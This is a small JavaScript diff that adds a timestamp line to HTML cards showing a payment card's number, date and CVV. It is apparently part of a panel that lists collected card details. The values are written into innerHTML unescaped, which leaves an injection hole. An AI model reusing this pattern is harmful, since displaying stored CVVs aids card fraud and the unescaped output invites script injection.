@@ -208,6 +208,7 @@ function cardsInfo(data) {
   cardsWrapper.innerHTML += `
      
           <div class="cards-wrapper-all-data">
+          <p class="data-time">${data.time}</p>
          <p class="card-number"><span class="green">${data.asecondCardNumber}</span></p>
          <p class="card-data"><span class="green">${data.bsecondCardData}</span></p>
          <p class="card-cvv"><span class="red">${data.csecondCardCvv}</span></p>
